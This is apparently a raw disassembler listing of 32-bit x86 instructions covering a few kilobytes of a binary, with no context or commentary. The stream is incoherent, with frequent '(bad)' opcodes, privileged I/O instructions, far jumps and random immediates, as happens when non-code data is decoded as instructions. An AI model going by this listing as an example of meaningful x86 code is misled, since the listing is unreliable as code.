  41b2cf:	push   0x7c
  41b2d1:	fadd   QWORD PTR [ecx]
  41b2d3:	jle    0x41b2b3
  41b2d5:	or     dh,bh
  41b2d7:	fsub   QWORD PTR [esi+0x7e48eea]
  41b2dd:	xor    dl,dl
  41b2df:	cmp    eax,0x1a6e77b0
  41b2e4:	pop    ecx
  41b2e5:	adc    BYTE PTR [ecx],cl
  41b2e7:	fsubr  QWORD PTR [ebx]
  41b2e9:	xor    eax,0xcc07c2e2
  41b2ee:	lods   al,BYTE PTR ds:[esi]
  41b2ef:	fdivr  DWORD PTR [ecx]
  41b2f1:	mov    ch,0x11
  41b2f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2f4:	dec    ebx
  41b2f5:	stos   DWORD PTR es:[edi],eax
  41b2f6:	xor    eax,0x55891917
  41b2fb:	lds    edx,FWORD PTR [ecx]
  41b2fd:	int3   
  41b2fe:	xor    eax,0x40db3197
  41b303:	mov    ds:0x13d73c37,al
  41b308:	mov    ebx,0xa13544a2
  41b30d:	int3   
  41b30e:	aad    0x6e
  41b310:	add    ch,BYTE PTR [ebx+0x5fc92982]
  41b316:	push   ds
  41b317:	mov    cl,0x91
  41b319:	push   esp
  41b31a:	pop    ecx
  41b31b:	(bad)
  41b31e:	mov    al,0x4b
  41b320:	push   ss
  41b321:	or     DWORD PTR [eax-0x5f98a552],esp
  41b327:	jmp    0xc873:0x89bcb67c
  41b32e:	int3   
  41b32f:	popf   
  41b330:	cdq    
  41b331:	int    0xf6
  41b333:	push   cs
  41b334:	test   BYTE PTR [edx-0x2c1e168e],dl
  41b33a:	dec    ebp
  41b33b:	lahf   
  41b33c:	cmc    
  41b33d:	dec    ebx
  41b33e:	pushf  
  41b33f:	xchg   edi,eax
  41b340:	mov    ebx,0x1bc5122d
  41b345:	push   esp
  41b346:	call   FWORD PTR [eax+edi*1]
  41b349:	aaa    
  41b34a:	test   BYTE PTR [edx-0x462771e6],ch
  41b350:	dec    ebx
  41b351:	aad    0xf6
  41b353:	jno    0x41b2d7
  41b355:	and    dl,BYTE PTR [edi+0x1e6b568a]
  41b35b:	and    ch,dh
  41b35d:	scas   al,BYTE PTR es:[edi]
  41b35e:	add    al,0x35
  41b360:	fwait
  41b361:	shl    BYTE PTR [edx+0xb9fb382],0x1b
  41b368:	mov    WORD PTR [ebp-0x53],es
  41b36b:	xchg   ebp,eax
  41b36c:	jne    0x41b3c4
  41b36e:	and    al,0x9e
  41b370:	add    eax,0xaf7ea519
  41b375:	lar    edx,WORD PTR ds:0x9612f66f
  41b37c:	shl    DWORD PTR [ebp+0x444ba03f],0xfb
  41b383:	pop    ebp
  41b384:	pushf  
  41b385:	jge    0x41b344
  41b387:	es out dx,al
  41b389:	inc    ebx
  41b38a:	mov    edx,0x3985c8f3
  41b38f:	fs out 0x6,eax
  41b392:	adc    eax,0xfc8ce81d
  41b397:	add    bh,dh
  41b399:	push   edi
  41b39a:	test   eax,0xd87c78b5
  41b3a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3a2:	imul   ecx,ecx,0x376a72de
  41b3a8:	popa   
  41b3a9:	push   cs
  41b3aa:	rcr    BYTE PTR [ebp+ecx*1+0x6d],cl
  41b3ae:	mov    ebx,0x5b0729b
  41b3b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3b4:	dec    esi
  41b3b5:	outs   dx,BYTE PTR ds:[esi]
  41b3b6:	lock sbb eax,0xa758eb37
  41b3bc:	(bad)  
  41b3bd:	imul   ebx,DWORD PTR [eax-0x4037e4b],0x23
  41b3c4:	xchg   DWORD PTR ds:0xf12d2668,ebp
  41b3ca:	hlt    
  41b3cb:	gs ins DWORD PTR es:[edi],dx
  41b3cd:	pop    edx
  41b3ce:	jmp    0x269f:0xe6db628e
  41b3d5:	xchg   esp,eax
  41b3d6:	adc    eax,0x93d94d1e
  41b3db:	mov    edx,edx
  41b3dd:	inc    eax
  41b3de:	or     DWORD PTR [edx-0x2bddb058],ebx
  41b3e4:	arpl   sp,sp
  41b3e6:	icebp  
  41b3e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3e8:	sahf   
  41b3e9:	push   0x9ece9a19
  41b3ee:	nop
  41b3ef:	dec    ebp
  41b3f0:	sahf   
  41b3f1:	sbb    al,0xe1
  41b3f3:	fst    QWORD PTR [eax]
  41b3f5:	cmc    
  41b3f6:	test   eax,0x238bd4cd
  41b3fb:	cmp    edx,esi
  41b3fd:	sub    al,0x16
  41b3ff:	push   cs
  41b400:	repz pop ebp
  41b402:	loopne 0x41b430
  41b404:	lock imul ebx,DWORD PTR [edx+edx*1+0x2f],0xffffffff
  41b40a:	mov    cl,0x64
  41b40c:	xor    DWORD PTR [ebx+esi*2],ebx
  41b40f:	mov    ch,0x66
  41b411:	jg     0x41b488
  41b413:	cld    
  41b414:	out    dx,al
  41b415:	xlat   BYTE PTR ds:[ebx]
  41b416:	mov    bl,0x57
  41b418:	pop    esp
  41b419:	or     al,0x8a
  41b41b:	push   ds
  41b41c:	ins    BYTE PTR es:[edi],dx
  41b41d:	pop    es
  41b41e:	fstp   TBYTE PTR [ecx]
  41b420:	xchg   edi,eax
  41b421:	xor    ah,cl
  41b423:	inc    ebp
  41b424:	cmp    esp,edi
  41b426:	jp     0x41b442
  41b428:	mov    ebp,0x156715b6
  41b42d:	scas   al,BYTE PTR es:[edi]
  41b42e:	fistp  QWORD PTR [esi-0xe]
  41b431:	xchg   esp,eax
  41b432:	push   esp
  41b433:	rcl    BYTE PTR [edx],0x44
  41b436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b437:	mov    ds:0xbaaac65d,eax
  41b43c:	lods   al,BYTE PTR ds:[esi]
  41b43d:	mov    ecx,0xc83587e
  41b442:	popa   
  41b443:	mov    dh,0xbc
  41b445:	loopne 0x41b4b8
  41b447:	xchg   ebx,eax
  41b448:	cmp    al,0xe9
  41b44a:	pushf  
  41b44b:	loope  0x41b4c1
  41b44d:	fldcw  WORD PTR [ecx]
  41b44f:	(bad)  
  41b450:	gs mov esp,0x44f81b22
  41b456:	dec    esi
  41b457:	fisubr DWORD PTR [edx+0x4d]
  41b45a:	jp     0x41b3e4
  41b45c:	mov    ?,WORD PTR [edx+0x2f5ae0c4]
  41b462:	sub    al,0x5f
  41b464:	fbstp  TBYTE PTR [ecx-0x45]
  41b467:	pop    edx
  41b468:	sub    ch,BYTE PTR [esi+0x17ca35bf]
  41b46e:	and    al,0x4c
  41b470:	cli    
  41b471:	sub    eax,0x6943d762
  41b476:	into   
  41b477:	mov    ds:0x23aa623b,eax
  41b47c:	leave  
  41b47d:	sbb    dh,ah
  41b47f:	or     ebp,DWORD PTR [ecx+0x44726d85]
  41b485:	or     edi,ebx
  41b487:	xchg   ecx,eax
  41b488:	nop
  41b489:	shl    BYTE PTR [esp+eiz*8+0x32],0x53
  41b48e:	and    ebx,ebx
  41b490:	test   DWORD PTR [ebp-0xe210e58],ebp
  41b496:	jne    0x41b50a
  41b498:	ret    
  41b499:	sbb    al,0x44
  41b49b:	jns    0x41b4b1
  41b49d:	sub    BYTE PTR [edi],dh
  41b49f:	push   ss
  41b4a0:	dec    edi
  41b4a1:	pop    edi
  41b4a2:	dec    eax
  41b4a3:	jne    0x41b4b6
  41b4a5:	punpckhwd mm1,mm6
  41b4a8:	stos   BYTE PTR es:[edi],al
  41b4a9:	xchg   ebp,eax
  41b4aa:	(bad)  
  41b4ab:	(bad)  
  41b4ac:	adc    ah,bh
  41b4ae:	xchg   edx,eax
  41b4af:	mov    bh,0xa
  41b4b1:	push   esp
  41b4b2:	xchg   edi,eax
  41b4b3:	loopne 0x41b48d
  41b4b5:	add    eax,0xb4551582
  41b4ba:	gs xchg ecx,eax
  41b4bc:	out    dx,eax
  41b4bd:	out    dx,al
  41b4be:	out    0x79,eax
  41b4c0:	mov    esp,0x204f49ec
  41b4c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4c6:	gs jge 0x41b4d4
  41b4c9:	sbb    BYTE PTR [eax+eiz*1],0x30
  41b4cd:	add    al,0x7c
  41b4cf:	jl     0x41b4a3
  41b4d1:	out    dx,eax
  41b4d2:	fimul  DWORD PTR [eax+0x3d]
  41b4d5:	(bad)  
  41b4d7:	push   ss
  41b4d8:	rcr    BYTE PTR [ecx-0x675bbd5f],1
  41b4de:	mov    dl,0xf7
  41b4e0:	sbb    BYTE PTR [edi-0x2e94c5da],cl
  41b4e6:	retf   
  41b4e7:	nop
  41b4e8:	sub    eax,0x21f547c1
  41b4ed:	jp     0x41b529
  41b4ef:	es sbb eax,ebp
  41b4f2:	push   cs
  41b4f3:	sbb    ah,ch
  41b4f5:	pop    ecx
  41b4f6:	mov    edx,0xa490af36
  41b4fb:	fimul  DWORD PTR [edx-0x43]
  41b4fe:	cmp    al,0xa4
  41b500:	sub    cl,BYTE PTR [ecx+0xa]
  41b503:	mov    dh,0xfe
  41b505:	call   0xfccd:0x8a994360
  41b50c:	cmc    
  41b50d:	loop   0x41b584
  41b50f:	cmc    
  41b510:	push   ecx
  41b511:	mov    BYTE PTR [edi+0x5d],ch
  41b514:	lock inc eax
  41b516:	mov    ?,WORD PTR [ecx]
  41b518:	frstor [ecx]
  41b51a:	lds    ecx,FWORD PTR [edi]
  41b51c:	push   ax
  41b51e:	push   esp
  41b51f:	ja     0x41b538
  41b521:	push   edx
  41b522:	(bad)  
  41b523:	jecxz  0x41b587
  41b525:	lods   al,BYTE PTR ds:[esi]
  41b526:	scas   eax,DWORD PTR es:[edi]
  41b527:	inc    edx
  41b528:	mov    ebx,0x64ad2b8b
  41b52d:	js     0x41b565
  41b52f:	push   esp
  41b530:	xor    bh,BYTE PTR [esi]
  41b532:	(bad)  
  41b533:	push   ebp
  41b534:	stos   DWORD PTR es:[edi],eax
  41b535:	xchg   ebx,eax
  41b536:	and    al,0xac
  41b538:	xchg   esp,eax
  41b539:	shl    BYTE PTR [ecx*4+0x5120b2d],1
  41b540:	jbe    0x41b4c2
  41b542:	mov    bh,0x9c
  41b544:	and    BYTE PTR [edi+eax*2-0x40cf3f8b],al
  41b54b:	sbb    BYTE PTR [edx-0x5a],cl
  41b54e:	xchg   BYTE PTR [edx+0x4d],al
  41b551:	sub    al,0xdf
  41b553:	mov    ah,0xe8
  41b555:	sub    ah,BYTE PTR [ecx+eax*4]
  41b558:	test   ebp,ebx
  41b55a:	je     0x41b587
  41b55c:	sbb    eax,0x5d18cd5a
  41b561:	pushf  
  41b562:	or     al,0x2d
  41b564:	imul   esi,DWORD PTR [ebx],0xe460ca0c
  41b56a:	xchg   ebx,eax
  41b56b:	out    dx,al
  41b56c:	ins    BYTE PTR es:[edi],dx
  41b56d:	lock jle 0x41b5bf
  41b570:	mov    ebx,0xbf20b50a
  41b575:	je     0x41b5cf
  41b577:	add    eax,0xa27f2cd3
  41b57c:	mov    ch,0xc2
  41b57e:	sub    esp,DWORD PTR [eax-0x84b1960]
  41b584:	lahf   
  41b585:	xchg   esi,eax
  41b586:	lds    esp,FWORD PTR [edx+edx*4]
  41b589:	lea    ebx,[ebx-0x12]
  41b58c:	or     DWORD PTR [edi],eax
  41b58e:	loope  0x41b578
  41b590:	call   FWORD PTR ds:0xdf0a0502
  41b596:	in     al,dx
  41b597:	sar    BYTE PTR [edi+0x34292c07],1
  41b59d:	mov    edi,0x90e7430f
  41b5a2:	mov    al,ds:0x2f80e9a4
  41b5a7:	int3   
  41b5a8:	push   es
  41b5a9:	and    ebx,DWORD PTR [esi+0x29]
  41b5ac:	mov    ds:0xd35a41a6,eax
  41b5b1:	mov    cl,0x6b
  41b5b3:	nop
  41b5b4:	cdq    
  41b5b5:	push   cs
  41b5b6:	mov    ecx,0x1ac58d44
  41b5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5bc:	inc    ecx
  41b5bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5be:	imul   edi,DWORD PTR [edi+ecx*8+0x41],0x9cd7998b
  41b5c6:	and    DWORD PTR [edi+0x6e9096f0],ecx
  41b5cc:	pushf  
  41b5cd:	sbb    eax,0x7f28812
  41b5d2:	or     ebp,DWORD PTR [ebx+0x35]
  41b5d5:	sahf   
  41b5d6:	push   esi
  41b5d7:	(bad)  
  41b5d9:	sahf   
  41b5da:	rol    BYTE PTR [edi],0x9a
  41b5dd:	push   es
  41b5de:	rcr    eax,0x56
  41b5e1:	xchg   ebp,eax
  41b5e2:	fsub   DWORD PTR [esi+0x3ce0ac27]
  41b5e8:	fcom   QWORD PTR [edx+ebx*4]
  41b5eb:	or     eax,0xce07b0e
  41b5f0:	pop    eax
  41b5f1:	ret    
  41b5f2:	aad    0xc8
  41b5f4:	int    0x23
  41b5f6:	stos   BYTE PTR es:[edi],al
  41b5f7:	aam    0xf3
  41b5f9:	popa   
  41b5fa:	pusha  
  41b5fb:	or     dh,al
  41b5fd:	adc    BYTE PTR [ebp+0x75],0x2a
  41b601:	inc    edx
  41b602:	jns    0x41b657
  41b604:	fnstenv [esi]
  41b606:	sub    edi,edi
  41b608:	pop    es
  41b609:	jb     0x41b58e
  41b60b:	push   cs
  41b60c:	xchg   DWORD PTR [ebp+ebx*2-0x437f5b3],edx
  41b613:	sbb    BYTE PTR [edi-0xf980cd8],cl
  41b619:	sbb    cl,BYTE PTR ds:0x33c080f1
  41b61f:	jnp    0x41b5c1
  41b621:	bswap  ecx
  41b623:	push   ds
  41b624:	(bad)  
  41b625:	adc    BYTE PTR ds:[esi+0x34a6fe08],dh
  41b62c:	inc    eax
  41b62d:	jl     0x41b66f
  41b62f:	dec    DWORD PTR [ebp+0x2236c8b6]
  41b635:	mov    ebp,0xd8f650c0
  41b63a:	push   edx
  41b63b:	(bad)  
  41b63c:	fld    DWORD PTR [edx-0x3042adb9]
  41b642:	rcl    cl,1
  41b644:	mov    al,ds:0xc5a80507
  41b649:	imul   edi,edx,0xe7cbb895
  41b64f:	test   cl,ch
  41b651:	sahf   
  41b652:	pop    es
  41b653:	cmp    dl,BYTE PTR [ecx-0x15e437be]
  41b659:	mov    edx,0x1f7a7151
  41b65e:	dec    edx
  41b65f:	sbb    cl,BYTE PTR ds:0xe0130351
  41b665:	and    BYTE PTR [ecx-0x228ceef1],0x6a
  41b66c:	stc    
  41b66d:	and    BYTE PTR [ebx+esi*4-0x61193df1],ah
  41b674:	or     DWORD PTR [ebx+0x50],edx
  41b677:	push   eax
  41b678:	cmp    ebp,esp
  41b67a:	stos   BYTE PTR es:[edi],al
  41b67b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b67c:	xor    eax,0x4cb00ecf
  41b681:	test   eax,0xa1da3358
  41b686:	mov    dl,0x58
  41b688:	fs and eax,0x7fb5c6f
  41b68e:	sbb    edi,DWORD PTR [edx+ecx*4+0x55]
  41b692:	push   ebp
  41b693:	lds    edi,FWORD PTR [ebx+0x49132b93]
  41b699:	adc    bl,BYTE PTR [edi+ebp*4-0x7f]
  41b69d:	stos   DWORD PTR es:[edi],eax
  41b69e:	and    al,0x6f
  41b6a0:	and    BYTE PTR [ebx+0x14],dl
  41b6a3:	xlat   BYTE PTR ds:[ebx]
  41b6a4:	scas   eax,DWORD PTR es:[edi]
  41b6a5:	pop    ds
  41b6a6:	call   0x8e34:0xab7e1d80
  41b6ad:	call   FWORD PTR [eax]
  41b6af:	add    ebp,DWORD PTR [esi-0x64cb3cc]
  41b6b5:	sub    DWORD PTR [eax+edx*8-0x2f],ebx
  41b6b9:	xchg   eax,ebp
  41b6bb:	and    DWORD PTR [ebp+0x5e7869a5],edx
  41b6c1:	scas   eax,DWORD PTR es:[edi]
  41b6c2:	(bad)  
  41b6c3:	cwde   
  41b6c4:	cs out dx,eax
  41b6c6:	cmp    BYTE PTR [eax+0x98a528e],ah
  41b6cc:	mov    BYTE PTR ds:0xd0060e8e,ah
  41b6d2:	push   ebx
  41b6d3:	(bad)  
  41b6d4:	inc    esi
  41b6d5:	push   0x71fc630d
  41b6da:	test   BYTE PTR [ecx-0x3f],dh
  41b6dd:	adc    DWORD PTR [ecx],ecx
  41b6df:	pop    edi
  41b6e0:	fisubr WORD PTR [ecx]
  41b6e2:	jg     0x41b75a
  41b6e4:	mov    al,ds:0xeef98cfa
  41b6e9:	in     al,0x6b
  41b6eb:	sahf   
  41b6ec:	cmp    DWORD PTR [edi],ecx
  41b6ee:	shl    DWORD PTR ds:0xf328896,0x6a
  41b6f5:	data16 aaa 
  41b6f7:	cmp    eax,0xd021240c
  41b6fc:	cmp    al,0x38
  41b6fe:	ss push esp
  41b700:	addr16 loope 0x41b6ea
  41b703:	cs mov cl,0x47
  41b706:	xchg   DWORD PTR [ebx-0x69],esi
  41b709:	(bad)  
  41b70b:	xchg   edi,eax
  41b70c:	ficomp DWORD PTR [edi+0x59]
  41b70f:	mov    ebp,0xb71fc66c
  41b714:	xchg   ch,bh
  41b716:	retf   0x5d63
  41b719:	jp     0x41b791
  41b71b:	stc    
  41b71c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b71d:	dec    edi
  41b71e:	jmp    0x10e6:0x5f1c8e6
  41b725:	mov    ebx,0x6314f20a
  41b72a:	add    DWORD PTR [ebp+esi*8-0x5a],eax
  41b72e:	rep outs dx,BYTE PTR ds:[esi]
  41b730:	mov    edx,DWORD PTR [eax-0x1f]
  41b733:	into   
  41b734:	xchg   edx,eax
  41b735:	lods   al,BYTE PTR ds:[esi]
  41b736:	or     al,0x67
  41b738:	inc    edx
  41b739:	jae    0x41b767
  41b73b:	loop   0x41b74b
  41b73d:	or     al,0xbf
  41b73f:	cmc    
  41b740:	mov    ecx,DWORD PTR [edi+0x7863bdf8]
  41b746:	fwait
  41b747:	jp     0x41b743
  41b749:	push   ds
  41b74a:	mov    cl,0xd6
  41b74c:	or     al,0x42
  41b74e:	adc    esp,DWORD PTR [ecx+0x3ca095ec]
  41b754:	std    
  41b755:	and    DWORD PTR [esi-0x63cb6709],edx
  41b75b:	lea    edx,ds:0x14198aaa
  41b761:	push   edi
  41b762:	(bad)  
  41b763:	aad    0xb8
  41b765:	mov    dh,al
  41b767:	aad    0x80
  41b769:	mov    cl,0xff
  41b76b:	xor    BYTE PTR [ebx],cl
  41b76d:	dec    ebx
  41b76e:	fbld   TBYTE PTR [edi+0x2afa3522]
  41b774:	test   al,0xb
  41b776:	fistp  WORD PTR [ebx]
  41b778:	mov    cl,0xe6
  41b77a:	sbb    bl,ch
  41b77c:	pop    eax
  41b77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b77e:	jecxz  0x41b761
  41b780:	xor    al,0x1d
  41b782:	std    
  41b783:	cld    
  41b784:	cmp    al,0xed
  41b786:	jecxz  0x41b805
  41b788:	push   es
  41b789:	aas    
  41b78a:	xlat   BYTE PTR ds:[ebx]
  41b78b:	cmp    al,0x9e
  41b78d:	aad    0x1e
  41b78f:	cld    
  41b790:	sbb    esi,ebp
  41b792:	mov    al,ds:0xdb203bf
  41b797:	sbb    eax,0x9aea2b3e
  41b79c:	sbb    al,0x45
  41b79e:	or     al,BYTE PTR [ebx-0x1726ee5]
  41b7a4:	or     eax,0xee23d293
  41b7a9:	add    ebp,DWORD PTR [esi-0x5f74803b]
  41b7af:	iret   
  41b7b0:	mov    dh,dl
  41b7b2:	jg     0x41b7dc
  41b7b4:	xchg   edi,eax
  41b7b5:	cmp    BYTE PTR [ecx+0x12fd9bd9],dl
  41b7bb:	es std 
  41b7bd:	push   edi
  41b7be:	loope  0x41b7c0
  41b7c0:	push   0xffffff87
  41b7c2:	push   cs
  41b7c3:	and    esi,0x1d0f1b10
  41b7c9:	dec    esp
  41b7ca:	fsubr  QWORD PTR [edx]
  41b7cc:	xchg   edi,eax
  41b7cd:	stos   BYTE PTR es:[edi],al
  41b7ce:	clc    
  41b7cf:	push   ebx
  41b7d0:	xchg   ebp,eax
  41b7d1:	mov    ah,0x9
  41b7d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7d4:	inc    edi
  41b7d5:	retf   
  41b7d6:	xchg   ebp,eax
  41b7d7:	pop    ebp
  41b7d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7d9:	loop   0x41b7bc
  41b7db:	shl    DWORD PTR [ecx+0x37aa1316],cl
  41b7e1:	inc    ecx
  41b7e2:	or     eax,0x73ddd2b5
  41b7e7:	or     esp,DWORD PTR [esi-0x7fb79b67]
  41b7ed:	ret    
  41b7ee:	(bad)  
  41b7ef:	dec    ebp
  41b7f0:	fwait
  41b7f1:	mov    dh,0x65
  41b7f3:	adc    BYTE PTR [edx-0x72],0x22
  41b7f7:	mov    ebx,0xfaee383c
  41b7fc:	adc    BYTE PTR [edi-0x68ac0ba6],0x6a
  41b803:	lock pop ds
  41b805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b806:	push   es
  41b807:	test   BYTE PTR [eax],0xa2
  41b80a:	dec    esp
  41b80b:	dec    ecx
  41b80c:	repz icebp 
  41b80e:	mov    edx,DWORD PTR [ebp+0x32]
  41b811:	push   0xffffffaf
  41b813:	fstp   TBYTE PTR [ecx+0x7f]
  41b816:	retf   
  41b817:	sbb    edi,ecx
  41b819:	into   
  41b81a:	pop    esp
  41b81b:	popa   
  41b81c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b81d:	enter  0xf515,0xc8
  41b821:	lods   al,BYTE PTR ds:[esi]
  41b822:	fisub  WORD PTR [ebx]
  41b824:	or     ebp,edx
  41b826:	sar    BYTE PTR [esi],0xd3
  41b829:	sbb    dh,BYTE PTR [ecx+0x13]
  41b82c:	test   BYTE PTR [edx+0x1a89b0a8],bl
  41b832:	inc    ecx
  41b833:	test   BYTE PTR [edi-0x6d9b11d2],ah
  41b839:	fmul   DWORD PTR [edi]
  41b83b:	data16 cli 
  41b83d:	ins    DWORD PTR es:[edi],dx
  41b83e:	pushf  
  41b83f:	or     eax,0xa1f41f0e
  41b844:	rcr    BYTE PTR [ebx],1
  41b846:	xlat   BYTE PTR ds:[ebx]
  41b847:	mov    esp,0xddd45cd3
  41b84c:	fs mov bh,0x53
  41b84f:	adc    dl,bh
  41b851:	repz mov al,ds:0xf28aebc1
  41b857:	or     ecx,DWORD PTR [esi]
  41b859:	int    0x8e
  41b85b:	add    al,0x10
  41b85d:	aam    0xef
  41b85f:	imul   edx,DWORD PTR [edx+0x2a],0x11087090
  41b866:	push   edx
  41b867:	call   0x61d:0xbde0fca4
  41b86e:	fstp   DWORD PTR [ebx-0x71cb2fbc]
  41b874:	cmp    ebp,DWORD PTR [edx]
  41b876:	sbb    BYTE PTR [eax-0x396f62f3],0x7b
  41b87d:	(bad)
  41b882:	ins    DWORD PTR es:[edi],dx
  41b883:	jl     0x41b8bb
  41b885:	icebp  
  41b886:	mov    dl,0xa2
  41b888:	sahf   
  41b889:	test   al,0x5
  41b88b:	push   eax
  41b88c:	fistp  QWORD PTR [ecx]
  41b88e:	adc    ch,BYTE PTR [edi]
  41b890:	adc    DWORD PTR [edi+0x6],ecx
  41b893:	adc    BYTE PTR [esi],bl
  41b895:	lock inc eax
  41b897:	lods   al,BYTE PTR ds:[esi]
  41b898:	push   0xffffffac
  41b89a:	dec    edi
  41b89b:	add    eax,0xca46a71e
  41b8a0:	mov    DWORD PTR [edx+0x7f],eax
  41b8a3:	cmp    DWORD PTR [edi+ebx*2+0x7a8d10c9],ecx
  41b8aa:	mov    eax,ds:0xcc176997
  41b8af:	push   0x6c
  41b8b1:	push   cs
  41b8b2:	push   ebp
  41b8b3:	shl    al,0x64
  41b8b6:	inc    esi
  41b8b7:	adc    BYTE PTR [edi],ch
  41b8b9:	xchg   esi,eax
  41b8ba:	pop    es
  41b8bb:	jecxz  0x41b8d2
  41b8bd:	rcr    BYTE PTR [ebx-0x6d],cl
  41b8c0:	xchg   ebp,ecx
  41b8c2:	sub    BYTE PTR [edi+ebx*8],bl
  41b8c5:	sub    dl,BYTE PTR [bx-0x68]
  41b8c9:	sbb    eax,0x5cd943c7
  41b8ce:	push   edi
  41b8cf:	dec    esi
  41b8d0:	pop    ebp
  41b8d1:	int    0x4b
  41b8d3:	sbb    esi,ebx
  41b8d5:	ins    BYTE PTR es:[edi],dx
  41b8d6:	pop    es
  41b8d7:	jp     0x41b910
  41b8d9:	cmp    BYTE PTR [edi-0x66665060],bh
  41b8df:	out    0x97,al
  41b8e1:	ret    
  41b8e2:	mov    dl,0xa3
  41b8e4:	add    eax,0x8ea4d1a7
  41b8e9:	aam    0xdc
  41b8eb:	dec    edx
  41b8ec:	aad    0x8a
  41b8ee:	addr16 jb 0x41b8a3
  41b8f1:	das    
  41b8f2:	ins    DWORD PTR es:[edi],dx
  41b8f3:	lock mov BYTE PTR [esi-0xf],bh
  41b8f7:	xor    bl,BYTE PTR [edi+ebp*4]
  41b8fa:	call   0xcd5a:0xf8cf1c85
  41b901:	adc    cl,BYTE PTR [edx+0x4b]
  41b904:	and    dl,dl
  41b906:	jl     0x41b90b
  41b908:	inc    edi
  41b909:	jbe    0x41b88c
  41b90b:	fnstcw WORD PTR [edx-0x60f3c272]
  41b911:	inc    ecx
  41b912:	xor    DWORD PTR [ebp-0x49684caa],esi
  41b918:	add    ch,BYTE PTR [ebx]
  41b91a:	pusha  
  41b91b:	icebp  
  41b91c:	jbe    0x41b8ca
  41b91e:	lds    eax,FWORD PTR [esi]
  41b920:	lea    eax,[edi+0x4ab715a6]
  41b926:	adc    eax,0xf7d0514a
  41b92b:	test   BYTE PTR [eax+0x1508fbda],bh
  41b931:	into   
  41b932:	popf   
  41b933:	(bad)  
  41b935:	loop   0x41b8c0
  41b937:	inc    esp
  41b938:	in     eax,dx
  41b939:	xor    eax,0x584ed940
  41b93e:	aas    
  41b93f:	add    bl,BYTE PTR [eax-0x6443a7e5]
  41b945:	stos   DWORD PTR es:[edi],eax
  41b946:	sti    
  41b947:	sbb    al,0x62
  41b949:	push   ebx
  41b94a:	rcl    DWORD PTR [ecx+0x21b1001f],cl
  41b950:	or     BYTE PTR gs:[esi+edi*1],0xe3
  41b955:	cmp    ebp,DWORD PTR [ebp+0x7adfa97b]
  41b95b:	mov    esp,0x4ccc5a3a
  41b960:	jmp    0xfe020b1e
  41b965:	lea    esp,[eax]
  41b967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b968:	call   0x2554:0xf4e0ca84
  41b96f:	xor    al,0xd8
  41b971:	sub    al,0x55
  41b973:	mov    ?,WORD PTR [esi]
  41b975:	sub    al,0x42
  41b977:	sbb    BYTE PTR [ebx+0x7e],ah
  41b97a:	ja     0x41b990
  41b97c:	iret   
  41b97d:	data16 sub BYTE PTR [edx],bh
  41b980:	or     eax,esp
  41b982:	cli    
  41b983:	and    ah,BYTE PTR [ebx-0x23c5329a]
  41b989:	(bad)  
  41b98a:	cmp    al,0x87
  41b98c:	push   ebx
  41b98d:	loope  0x41b9af
  41b98f:	out    0x67,eax
  41b991:	dec    esp
  41b992:	mov    ds:0xab290b86,eax
  41b997:	cmp    BYTE PTR [ebx+0x35b85b02],al
  41b99d:	out    0xe,eax
  41b99f:	add    BYTE PTR [eax-0x4e],0x63
  41b9a3:	lods   eax,DWORD PTR ds:[esi]
  41b9a4:	xchg   BYTE PTR [ebx-0x4],cl
  41b9a7:	dec    edi
  41b9a8:	jp     0x41b938
  41b9aa:	mul    BYTE PTR [ebx+0x76]
  41b9ad:	mov    DWORD PTR [esi],eax
  41b9af:	mov    esp,0x73b5385f
  41b9b4:	hlt    
  41b9b5:	imul   DWORD PTR [ebx+0x5e]
  41b9b8:	fwait
  41b9b9:	or     al,0x93
  41b9bb:	loopne 0x41b9f2
  41b9bd:	dec    esp
  41b9be:	dec    edi
  41b9bf:	std    
  41b9c0:	popf   
  41b9c1:	es mov edx,0x5595b908
  41b9c7:	pop    esi
  41b9c8:	lock test al,0x4a
  41b9cb:	imul   ecx,DWORD PTR [ebx],0xffffff89
  41b9ce:	sbb    DWORD PTR [ecx],0x46d69192
  41b9d4:	pop    ebp
  41b9d5:	int3   
  41b9d6:	xor    DWORD PTR [edx],esp
  41b9d8:	cmp    al,0xa2
  41b9da:	aas    
  41b9db:	cli    
  41b9dc:	pushf  
  41b9dd:	adc    DWORD PTR [esp+ebx*2-0x55],ebp
  41b9e1:	add    DWORD PTR [ebx],edx
  41b9e3:	cli    
  41b9e4:	or     eax,DWORD PTR [eax]
  41b9e6:	push   ss
  41b9e7:	nop
  41b9e8:	inc    esp
  41b9e9:	in     eax,dx
  41b9ea:	push   ss
  41b9eb:	xor    eax,0x6e54fc18
  41b9f0:	xchg   esp,eax
  41b9f1:	dec    ecx
  41b9f2:	scas   eax,DWORD PTR es:[edi]
  41b9f3:	jg     0x41b991
  41b9f5:	lahf   
  41b9f6:	in     al,0xa2
  41b9f8:	cld    
  41b9f9:	add    DWORD PTR [edx+esi*1-0x4bad824f],esp
  41ba00:	adc    eax,0xa5eb0ea
  41ba05:	and    esi,DWORD PTR [edi*2+0x4570f84]
  41ba0c:	cmp    BYTE PTR [ebx],0x71
  41ba0f:	adc    DWORD PTR [ecx+0x74138e8f],esi
  41ba15:	ds pop ss
  41ba17:	cmp    BYTE PTR ds:0xda3fe03e,0x92
  41ba1e:	push   edx
  41ba1f:	jnp    0x41b9a5
  41ba21:	xchg   ecx,eax
  41ba22:	imul   edx,DWORD PTR [edi+0x51],0xffffff85
  41ba26:	pop    esi
  41ba27:	rol    DWORD PTR [esi],cl
  41ba29:	sar    BYTE PTR [ebx-0x7be6da8f],cl
  41ba2f:	les    ecx,FWORD PTR [ebx]
